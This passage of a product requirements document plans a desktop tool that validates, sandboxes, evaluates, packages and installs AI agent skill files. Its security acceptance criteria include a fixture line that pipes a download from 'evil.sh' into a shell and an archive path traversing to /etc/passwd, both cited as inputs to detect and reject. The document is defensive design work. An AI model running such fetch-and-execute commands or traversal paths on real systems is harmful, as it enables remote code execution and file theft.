- **AC-1.3c** A skill named `synced`, `anthropic-skills`, or within the `anthropic-skills:` namespace is flagged as reserved for the Claude target.
- **AC-1.4** A skill name containing non-ASCII Unicode letters (e.g. Korean) is **accepted**, and the diagnostic engine does not report a character-set error for it.
- **AC-1.5** `lenient` reports cosmetic violations (name≠dir, name>64) as `warn` while `strict` reports them as `error`, from a single rule engine.
- **AC-1.6** Parse failures are distinguished from validation failures and map 1:1 to: missing opening `---`, unterminated frontmatter, YAML syntax error, non-mapping frontmatter.
- **AC-1.7** A `description` containing an unquoted colon (`description: Use this skill when: ...`) — the exact cross-client hazard the official guide calls out — is reported with a concrete fix, not an opaque parse error.
- **AC-1.8** Body-level advisories fire correctly: >500-line body, and a relative link in the body pointing at a non-existent file.
- **AC-1.9** **Differential conformance (CI):** over a ≥60-case fixture corpus, our `strict` verdict matches pinned `skills-ref==0.1.1`; every intentional divergence is on an explicit, justified known-divergence list.
- **AC-1.10** Validation of a 5,000-skill directory scan completes in <2s wall-clock on a developer laptop, and never loads file bodies into memory to do so (tier-1 catalog cost is metadata-only, per the spec's progressive-disclosure model).

### AC-2 — Testing (L2 + L3)
- **AC-2.1** A skill with `scripts/hello.py` can be statically analyzed with no execution, producing a capability report listing interpreter (`python3`) and declared dependencies.
- **AC-2.1a** A skill whose **body** contains `` !`curl evil.sh | sh` `` is flagged `body-shell-exec` by the static analyzer, with **no execution required**.
- **AC-2.1b** A ` ```! ` fenced block is flagged identically to the inline form.
- **AC-2.1c** The inline-form trigger rule is exact: `!`cmd`` at line-start or after whitespace **is** flagged; `KEY=!`cmd`` is **not** flagged and is reported as literal text.
- **AC-2.1d** A `hooks` frontmatter field is flagged `session-persistent-hook`; an `allowed-tools` field is flagged `tool-preapproval`. Neither requires executing anything.
- **AC-2.1e** `disable-model-invocation: true` is parsed and honored by the L3 runner (§4.6): such a skill is **not** auto-activated in a with-skill arm, and the eval report states this rather than silently testing a path the client would never take.
- **AC-2.2** With the sandbox enabled, a selected script runs with **no network access**, cannot write outside its output directory, and is killed at the timeout. Verified by a test script that *attempts* each escape and is asserted to fail.
- **AC-2.3** Sandbox denial is **fail-closed**: if the sandbox cannot be established, the run does not proceed unsandboxed. It errors.
- **AC-2.4** `evals/evals.json` matching the documented schema round-trips: parse → validate → serialize → re-parse, byte-stable.
- **AC-2.5** A full eval run against the `MockAdapter` produces exactly the documented workspace tree (`iteration-N/eval-*/{with_skill,without_skill}/{outputs,timing.json,grading.json}` + `benchmark.json`), with no extra required fields.
- **AC-2.6** **The entire L3 pipeline runs in CI with `MockAdapter`, with no network and no API key**, and is deterministic across runs.
- **AC-2.7** `benchmark.json` contains `mean` and `stddev` for `pass_rate`/`time_seconds`/`tokens` per arm plus `delta`; when `n < 2` runs per arm the UI **displays a "not enough runs" state instead of a stddev**.
- **AC-2.8** A deterministic assertion (e.g. "output is valid JSON") is graded **without** invoking the LLM judge — verifiable by asserting the judge adapter received zero calls.
- **AC-2.9** An LLM-judged PASS lacking quotable evidence in the output is recorded as not-passed.
- **AC-2.10** The engine surfaces the four prescribed analyses: assertions passing in both arms, failing in both arms, passing only with the skill, and high-variance across repeats.
- **AC-2.11** A baseline can be run against a **snapshot of the previous version** (not just "no skill"), writing to `old_skill/`.
- **AC-2.12** At least two distinct real `RunAdapter` implementations exist behind one interface, proving provider-agnosticism (G5).

### AC-3 — Packaging & install (D4)
- **AC-3.1** Building the same skill twice yields **byte-identical** archives (asserted by comparing SHA-256 in a test).
- **AC-3.2** `manifest.json` is produced outside the archive, lists a per-file content hash and a whole-tree hash, and the tree hash is reproducible.
- **AC-3.3** A packaged artifact round-trips: package → extract → `strict` validation → identical validated model to the original.
- **AC-3.4** Install into `~/.agents/skills/<name>/` places `SKILL.md` at the correct depth with the directory named exactly as `name`.
- **AC-3.5** Install is atomic — an induced failure mid-install leaves the prior version intact and the live path unmodified.
- **AC-3.6** After install, discovery (as a real client performs it) finds the skill, and the UI reports it as visible.
- **AC-3.7** A name collision between project-level and user-level scopes surfaces a **shadowing warning**; the installer does not silently choose.
- **AC-3.8** Uninstall removes exactly what install created and nothing else.

### AC-4 — Import & security
- **AC-4.1** An archive containing `../../etc/passwd` or an absolute path is **rejected at staging**, before any write outside the temp dir.
- **AC-4.2** A symlink pointing outside the staging root is rejected.
- **AC-4.3** Import refuses to install into a live skills path while any `strict` error is present.
- **AC-4.4** Importing a skill whose `scripts/` triggers the network/credential/destructive-write lints requires explicit user confirmation, and the specific findings are displayed before the confirm.
- **AC-4.5** The UI states, at the point of import, that the `description` field is injected into all future sessions' catalogs.
- **AC-4.6** Import from a git source and from the registry API both produce a skill that passes `strict` validation, verified by an integration test against a fixture repo (network-gated, not required for the base build).
- **AC-4.7** Unpacked size and file count are capped, and exceeding the cap fails with a clear error.

### AC-5 — Contract & quality gates
- **AC-5.1** TypeScript types are **generated** from the Pydantic JSON Schema; a deliberate contract change breaks the TS build until regenerated.
- **AC-5.2** A contract-version mismatch at startup produces a clear, actionable error.
- **AC-5.3** Python core has ≥90% line coverage on `spec-core`, `packager`, and `installer`; every acceptance criterion above has at least one automated test.
- **AC-5.4** `ruff check`, `ruff format --check`, `basedpyright` (strict), `vitest`, and `pytest` all pass in CI.
- **AC-5.5** The Tauri build produces an installable artifact for macOS (universal binary) and Windows.

### AC-6 — End-to-end
- **AC-6.1** A user creates a skill from scratch in the UI, sees zero validation errors, defines 2 evals, runs them with a real provider, reads a grading report with evidence, compares against baseline, packages reproducibly, installs to `~/.agents/skills/`, and confirms client visibility — with no step requiring a terminal.
- **AC-6.2** The same skill, exported and re-imported into a clean profile, validates identically.

---

## 7. Component → development plan

Each component lists deliverables, dependencies, and its own acceptance criteria (all
traceable to §6). Phases are ordered by dependency; components within a phase can proceed in
parallel.

### Phase 0 — Spikes (timeboxed; results feed Phase 1+)

| Spike | Question | Success criterion | Blocks |
|---|---|---|---|
| **S1 — Sandbox feasibility** | Can we execute untrusted skill scripts with no network + FS confinement **on a stock macOS/Windows dev machine**? | A container or OS-level sandbox runs a script that attempts (a) network egress, (b) write outside its dir, (c) fork bomb — and all three fail, on both target platforms | §4.5, AC-2.2/2.3 |
| **S2 — Tauri sidecar + socket** | Can Python be supervised as a Tauri sidecar and reached over a unix socket on all 3 target platforms (notably Windows, where unix sockets need care)? | Round-trip request/response <10ms p50; clean shutdown; no orphaned processes | §4.7, all UI phases |
| **S3 — Adapter reality check** | Which agent runtime gives per-run clean-context isolation, and reports `total_tokens` + `duration_ms`? | Two providers each produce an isolated run **and** report both metrics | §4.6, AC-2.12 |
| **S4 — Editor integration** | Can CodeMirror 6 render YAML-frontmatter lint diagnostics anchored to exact line/col from a JSON Schema + custom rules? | Diagnostic squiggles align with the right characters while typing | Editor component |

> **S1 is the highest-risk item in the project.** If stock-container-free confinement is not
> achievable, the honest fallback is **static analysis only in v1** (drop dynamic L2, keep the
> analyzer) — a narrower product, but not a lying one. This decision is made *after* S1, not
> guessed at now.

### Phase 1 — `spec-core` (foundation; blocks everything)

**Deliverables**
1. Pydantic models for `SkillFrontmatter` / `SkillDocument` / `Diagnostic`, with the
   `allowed-tools` ↔ `allowed_tools` hyphen mapping handled explicitly.
2. Parser: frontmatter extraction, the four distinct parse errors, `SKILL.md`/`skill.md`
   discovery, lenient YAML recovery for the unquoted-colon class.
3. Rule engine with a per-profile severity map — **one** engine, two profiles.
4. All spec rules from §4.2, each with a stable diagnostic `code`.
5. **Known-extension registry** (§4.2) as versioned data, seeded with all 14 Claude Code
   fields; drives the extension-vs-typo diagnostic split (AC-1.3a).
6. **Dual description budget check** — spec 1,024 chars, client listing 1,536 chars
   (`description` + `when_to_use` combined) (AC-1.3b).
7. **Reserved-name check** for the Claude target: `synced`, `anthropic-skills`, and the
   `anthropic-skills:` namespace (AC-1.3c).
8. Body-level advisories (line count, token estimate, relative-link resolution).
9. JSON Schema emission + TS type generation wired into the build.
10. **Differential conformance harness** vs pinned `skills-ref==0.1.1` + ≥60-case corpus
    + known-divergence registry. The corpus must include Claude Code extension fields as
    inputs, since that is exactly where we intentionally diverge.
11. Vector-snapshot catalog scan (metadata only, for AC-1.10).

**Definition of done:** AC-1.1 … AC-1.10 and AC-1.3a–1.3c all green; `pytest` + `ruff` +
`basedpyright` clean.

**Risks:** the unicode-name divergence (§4.2), the `str`-coercion semantics, and the
deliberate extension-field divergence from `skills-ref`. All three are handled by the
known-divergence registry rather than by silently choosing.

### Phase 2 — `skill-io`, `packager`, `installer` (parallel; depend on Phase 1)

**2a — `skill-io`**
Read/write skill directories preserving arbitrary extra files. Import adapters (folder,
archive, git, registry API) behind one interface. Staging + path-safety scan. Trust-gate
report generation.
*Done when:* AC-4.1/4.2/4.4/4.5/4.7 green. Malicious-archive fixtures in CI.

**2b — `packager`**
Deterministic tar.gz; `manifest.json` emitted outside the archive; double-build byte-equality
test.
*Done when:* AC-3.1/3.2/3.3 green.

**2c — `installer`**
Target-path table; scope precedence with shadowing warnings; atomic install via temp+rename;
uninstall; post-install discovery verification.
*Done when:* AC-3.4/3.5/3.6/3.7/3.8 green, **including** the client-hazard cases from §4.9:
reserved names refused, `~/.claude/skills/synced/` never written, user-authored symlinked
skill folders followed, and post-install discovery run from the session's real start
directory (parent-directory walk).

**These three are independent and can run concurrently.**

### Phase 3 — L2: `script-analyzer` + `sandbox-runner` (depends on S1, Phase 1)

**3a — `script-analyzer`** (no S1 dependency — can start immediately)
Interpreter detection, PEP 723 / manifest dependency extraction, capability lints
(network, credentials, FS escape, subprocess, `eval`).
**Whole-skill surface, not just `scripts/`** (per §4.5): body `` !`cmd` `` placeholders and
` ```! ` blocks with the exact trigger rule, `hooks` session-persistence, `allowed-tools`
pre-approval, `shell` selector. Zero execution, so this is *not* blocked by S1 and is the
highest-value security work in the project relative to effort.
*Done when:* AC-2.1, AC-2.1a–2.1d green; analyzer is a pure function of file bytes (trivially
testable, and therefore testable against adversarial fixtures).

**3b — `sandbox-runner`** (blocked on S1)
Container/OS sandbox construction, resource caps, fail-closed startup check, full
stdout/stderr capture and run persistence.
*Done when:* AC-2.2/2.3 green **including the adversarial escape tests**.

### Phase 4 — L3: `eval-engine` (depends on S3, Phase 1)

Sequenced internally:

| Step | Deliverable | Done when |
|---|---|---|
| 4.1 | `EvalSuite`/`EvalCase`/`Timing`/`Grading`/`Benchmark` models; round-trip stability | AC-2.4 |
| 4.2 | `RunAdapter` protocol + `MockAdapter` | AC-2.6 |
| 4.3 | Workspace layout writer — byte-compatible with the documented tree | AC-2.5 |
| 4.4 | A/B orchestration: with-skill vs without-skill vs prior-version snapshot; clean-context isolation per run | AC-2.11 |
| 4.5 | Deterministic checker registry (runs first, no LLM) | AC-2.8 |
| 4.6 | LLM judge adapter with evidence enforcement | AC-2.9 |
| 4.7 | `benchmark.json` aggregation + low-`n` state | AC-2.7 |
| 4.8 | The four prescribed analyses | AC-2.10 |
| 4.9 | ≥2 real adapters | AC-2.12 |

*Done when:* all of AC-2 green, and the **entire pipeline is green in CI offline via
`MockAdapter`**.

### Phase 5 — Tauri shell + UI (depends on S2, S4; integrates Phases 1–4)

| Component | Deliverable |
|---|---|
| `src-tauri/` | Sidecar supervision, unix-socket IPC router, native dialogs, capability ACL, autoupdate |
| `Editor` | CodeMirror 6, YAML+Markdown, live diagnostics from `spec-core`, frontmatter form widgets |
| `FileTree` | Skill directory tree; add/rename/delete with live re-validation |
| `DiagnosticsPanel` | Filterable by severity/code; click→jump-to-span; quick-fix application |
| `TestRunnerView` | Eval case editor; run controls; streaming output; A/B arm comparison |
| `ReportView` | Grading table with evidence; benchmark chart; the four analyses; `feedback.json` editor |
| `ImportDialog` | Source picker; path-safety + capability report; trust gate |
| `PackageDialog` | Target selection; manifest preview; reproducible build + digest display |

*Done when:* AC-5.1/5.2/5.5 and AC-6.1/6.2 green.

### Phase 6 — Hardening & release
Security review of the sandbox + import path; full AC sweep; cross-platform CI;
performance pass against AC-1.10; installable artifacts (AC-5.5).
*Done when:* **every** AC in §6 is green and architect-verified.

### Parallelization map

```
Phase 0:  S1 ─────────────► Phase 3b
          S2 ─────────────► Phase 5
          S3 ─────────────► Phase 4
          S4 ─────────────► Phase 5

Phase 1:  spec-core ──┬──► Phase 2a/2b/2c (parallel)
                     ├──► Phase 3a
                     ├──► Phase 4
                     └──► Phase 5

Phase 2:  2a ═══ 2b ═══ 2c        (3-way parallel)
```

---

## 8. Technical constraints

| # | Constraint | Rationale |
|---|---|---|
| C1 | The spec's closed frontmatter field set is enforced; no top-level keys beyond the 6 | `ALLOWED_FIELDS`, verified in `validator.py` |
| C2 | `name` validation is Unicode-aware and NFKC-normalized | Reference impl; ASCII-only would reject valid i18n names |
| C3 | `skills-ref` is a **dev/test-only** dependency, pinned | Its README disclaims production use |
| C4 | Rust holds no domain logic (<800 LOC, shell only) | Keeps the core testable headlessly |
| C5 | All IPC payloads validated at the boundary, both directions | The IPC boundary is the top structural risk of D2 |
| C6 | Sandbox is **fail-closed** | Fail-open is indistinguishable from no sandbox |
| C7 | L2 dynamic execution is **opt-in, default off** | The studio would otherwise be a malware vector |
| C8 | No LLM-driven auto-execution of skill scripts in v1 | Requires adversarial-safety review; v2 |
| C9 | `MockAdapter` keeps L3 fully runnable offline in CI | AC-2.6; no network/key in the critical path |
| C10 | No runtime dependency on a specific model vendor | G5; the standard is provider-agnostic |
| C11 | Frontend never hand-writes wire types | AC-5.1 |
| C12 | Nothing is written to a live skills path without passing `strict` | The one invariant that makes import safe |
| C13 | Undeclared `frontmatter` extras are errors, but *client* extras in `metadata` are fine | `metadata` is the spec's designated escape hatch |
| C14 | The known-extension registry is **data, not code** — a versioned table of client fields, each tagged with the honoring client | Adding a client must not require touching the rule engine; clients add fields faster than the spec does |
| C15 | The static analyzer covers the **whole skill**, not just `scripts/` | A skill body can execute shell commands via `!`backtick` / ` ```! ` before the model sees it. Body-only execution is a real surface with no `scripts/` dir. |
| C16 | A user-authored symlinked skill folder is trusted; an **archive**-supplied symlink is rejected | Different trust provenance. Collapsing these either breaks legitimate setups or admits traversal |

---

## 9. Open risks

| Risk | Impact | Mitigation |
|---|---|---|
| **Sandbox infeasible without a container runtime** (S1) | L2 dynamic execution drops from v1 | Fail-closed; fall back to static-analysis-only v1. Decide after S1, not now. |
| **Windows unix-socket / process-group semantics** (S2) | L2 timeout enforcement, sidecar shutdown | S1/S2 gate Phase 3b/5. Fallback: loopback TCP on an ephemeral port. |
| **Spec drift** — the rules exist only in prose + a non-production reference lib; no JSON Schema is published | Validator silently diverges → accepts invalid or rejects valid skills | Differential conformance in CI (AC-1.9) turns drift into a red build. **This is why C3 exists.** |
| **Client extensions outrun the spec** — 14 Claude Code fields are already non-standard, and clients add more | Author deletes a *working* skill because the validator called a functional field "unknown" | Known-extension registry as data (C14); extension diagnostics distinguish *portability* from *typo* (AC-1.3a) |
| **Skill bodies execute shell commands** (`` !`cmd` ``, ` ```! ``) with no `scripts/` dir; the `disableSkillShellExecution` guard is a *host* setting the author cannot set | A "harmless markdown" skill runs commands at load time | Static whole-skill analysis, default-on, zero-execution (C15, AC-2.1a–2.1d); surfaced at import trust gate and before publish |
| **A skill can install successfully and still never load** (reserved names, `synced/` ownership, shadowing, parent-dir discovery) | "Installed" is a false claim; the most confusing possible failure | Post-install verification mirrors real client discovery incl. reserved-name + shadowing checks (AC-3.6) |
| **Unicode `name` ambiguity** — spec prose is narrower than the reference impl | Rejecting valid i18n names, or accepting ones clients reject | Report as an explicit `spec-ambiguity` diagnostic; do not decide silently |
| **LLM-judge grading is non-deterministic and costly** | Flaky reports, runaway spend | Deterministic checkers first; per-run token/time caps; `MockAdapter` in CI; disclose cost before a run |
| **Reference-harness provider drift** (S3) | `total_tokens`/`duration_ms` unavailable → `timing.json` cannot be filled | Adapter capability flags; degrade explicitly rather than emit zeros |
| **Two-process architecture raises the bar for contributors** | Slower onboarding | S2 spike de-risks; backend runs headless with no Rust build, which offsets it |
| **Untrusted-skill security review is late** | Finding an escape after shipping the runner | Sandbox escape tests are written *first* (AC-2.2), and Phase 6 mandates a security review of the import + sandbox path |

---

## 10. Definition of done

The PRD is complete when **every** AC in §6 is green in CI and an architect review confirms:

1. The validator is conformant per the differential suite, with declared divergences.
2. Sandbox escape tests fail closed on both target platforms.
3. The full L3 pipeline runs offline and deterministically in CI.
4. Artifacts are byte-reproducible.
5. No unvalidated skill can reach a live skills path.
6. The E2E flow in AC-6.1 completes with no terminal step.
7. The static analyzer demonstrably catches **body-level** shell execution
   (`` !`cmd` ``, ` ```! ``), not just `scripts/` — verified by a fixture that contains
   nothing but a `SKILL.md` and is still correctly flagged.

**Next step:** `/ralph "implement the PRD at docs/PRD.md"`
